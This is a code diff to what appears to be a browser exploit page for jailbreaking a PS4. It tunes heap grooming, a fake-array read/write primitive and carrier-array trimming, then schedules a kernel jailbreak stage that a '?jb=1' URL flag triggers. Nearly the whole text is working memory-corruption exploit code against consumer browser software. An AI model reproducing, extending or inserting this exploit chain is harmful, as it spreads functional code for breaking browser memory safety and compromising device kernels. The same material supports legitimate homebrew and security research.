@@ -118,7 +118,7 @@ html, body {
 // ========== SHARED CONFIG ==========
 var Q = new URLSearchParams(location.search);
 
-var REVISION = "genuine-u8-rw-14-1352";
+var REVISION = "genuine-u8-rw-15-1352";
 var headerMsg = "mansoor0x";
 
 var MAX_ATTEMPTS = (function(){
@@ -127,13 +127,13 @@ var MAX_ATTEMPTS = (function(){
     return Math.max(1, Math.min(10, v));
 })();
 
+var SIMPLE_JB = Q.get("simplejb") !== "0";
 var DRAIN_COUNT = (function(){
-    var v = parseInt(Q.get("n") || "128", 10);
-    if (!isFinite(v)) v = 128;
+    var def = SIMPLE_JB ? "64" : "128";
+    var v = parseInt(Q.get("n") || def, 10);
+    if (!isFinite(v)) v = parseInt(def, 10);
     return Math.max(32, Math.min(512, v));
 })();
-
-var SIMPLE_JB = Q.get("simplejb") !== "0";
 var CARRIER_SLOTS = (function(){
     var def = SIMPLE_JB ? "2000000" : "800000";
     var v = parseInt(Q.get("c") || def, 10);
@@ -1136,8 +1136,10 @@ function reportComposition() {
     mark("SSV-RETURNED-CLEARED", "length=" + compositionLength + "-predecessor-cleared=true");
     mark("RW-CARRIER", "slid=" + hex(uint32At(rwHeader, 0)) + "-vendor=" + hex(rwOriginalVector) + "-length=0x100-mode=0x" + rwHeader[0x28].toString(16));
     mark("TARGET-CELL", "P=" + hex(targetAddress) + "-slid=" + hex(uint32At(targetHeader, 0)) + "-length=0x100-mode=0x" + targetHeader[0x28].toString(16));
-    mark("RW-HEADER-HEX", dumpHex(rwHeader));
-    mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
+    if (Q.get("hex") === "1" || !RUN_KERNEL_STAGE) {
+        mark("RW-HEADER-HEX", dumpHex(rwHeader));
+        mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
+    }
 
     var readPass = rwHeaderOK && targetHeaderOK && readObserved && compositionLength === EXPECTED_LENGTH;
     var writePass = writeObserved && restoreObserved;
@@ -1152,13 +1154,19 @@ function reportComposition() {
         attemptSucceeded = true;
         mark("GENUINE-UB-RW-PASS", "carrier-vector-restored=true");
         try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
-        if (MEM_DROP_AFTER_RW || !RUN_KERNEL_STAGE) releasePreJailbreakMemory();
-        else mark("MEM-KEEP", "kernel-stage-needs-live-fake-array");
-        if (!testRun) {
-            testRun = true;
-            if (KERNEL_LAB) {
-                setTimeout(runKernelLab, JB_DELAY_MS);
-            } else if (!RUN_JAILBREAK) {
+
+        function markRootsLive() {
+            try {
+                mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16) + "-target-byte=" + targetView[0].toString(16) + "-length-word=" + lengthWord.keep.toString(16));
+            } catch (e) {
+                mark("ROOTS-LIVE", "err=" + (e && e.message));
+            }
+            scheduleSurvivalMarks();
+        }
+
+        function scheduleKernelStage() {
+            if (KERNEL_LAB) setTimeout(runKernelLab, JB_DELAY_MS);
+            else if (!RUN_JAILBREAK) {
                 mark("HALTED-BEFORE-JAILBREAK", "rw-primitive-ready-no-kernel-writes-performed");
                 mark("HALT-NOTE", "append-?jb=1-to-url-to-run-kernel-jailbreak-or-klab=1");
             } else {
@@ -1166,10 +1174,34 @@ function reportComposition() {
                 setTimeout(runJailbreak, JB_DELAY_MS);
             }
         }
+
+        function afterRwPassTrimmed() {
+            markRootsLive();
+            if (!testRun) {
+                testRun = true;
+                scheduleKernelStage();
+            }
+        }
+
+        if (!testRun) {
+            if (RUN_KERNEL_STAGE) {
+                releasePostRwGroomOnly();
+                trimCarrierTailBatched(afterRwPassTrimmed);
+            } else {
+                if (MEM_DROP_AFTER_RW) releasePreJailbreakMemory();
+                afterRwPassTrimmed();
+            }
+        } else {
+            markRootsLive();
+        }
+    } else {
+        try {
+            mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16) + "-target-byte=" + targetView[0].toString(16) + "-length-word=" + lengthWord.keep.toString(16));
+        } catch (e) {
+            mark("ROOTS-LIVE", "err=" + (e && e.message));
+        }
     }
 
-    mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16) + "-target-byte=" + targetView[0].toString(16) + "-length-word=" + lengthWord.keep.toString(16));
-    if (readPass && writePass) scheduleSurvivalMarks();
     if (!attemptSucceeded) scheduleRetry("rw-verify-miss");
 }
 
@@ -1310,6 +1342,61 @@ function dropCarrierBatched() {
         }
     }
     setTimeout(step, 80);
+}
+
+function dropFillerGraphImmediate() {
+    if (fillerGraph) {
+        fillerGraph.length = 0;
+        fillerGraph = null;
+    }
+    outerGraph = null;
+}
+
+function trimCarrierTailBatched(done) {
+    if (!getterCarrier || CARRIER_SLOTS <= 4) {
+        if (done) done(0);
+        return;
+    }
+    var carrier = getterCarrier;
+    var idx = 4;
+    var batch = 25000;
+    var freed = 0;
+    function step() {
+        var end = Math.min(idx + batch, CARRIER_SLOTS);
+        for (var i = idx; i < end; i++) {
+            try {
+                if (i in carrier) {
+                    delete carrier[i];
+                    freed++;
+                }
+            } catch (_) {}
+        }
+        idx = end;
+        if (idx < CARRIER_SLOTS) setTimeout(step, 0);
+        else {
+            mark("CARRIER-TRIM", "freed=" + freed + "-kept-slots-0-3");
+            if (done) done(freed);
+        }
+    }
+    setTimeout(step, 0);
+}
+
+// Groom/filler only — keeps getterCarrier[0..3], fakeHost, globalFakeArray.
+function releasePostRwGroomOnly() {
+    try { history.replaceState(null, ""); } catch (_) {}
+    referenceTarget = null;
+    preparedSymbolObject = null;
+    capturedString = null;
+    capturedWords = null;
+    leakedScope = null;
+    predecessorWords = null;
+    rwHeader = null;
+    targetHeader = null;
+    for (var i = 0; i < keepAlive.length; i++) keepAlive[i] = null;
+    keepIndex = 0;
+    dropFillerGraphImmediate();
+    compactLog(28);
+    mark("MEM-TRIM", "groom+filler-out-carrier-tail-batched-next");
 }
 
 // Drop SSV/addrof/groom garbage after RW is live (PS4 browser OOMs if one big GC spike).
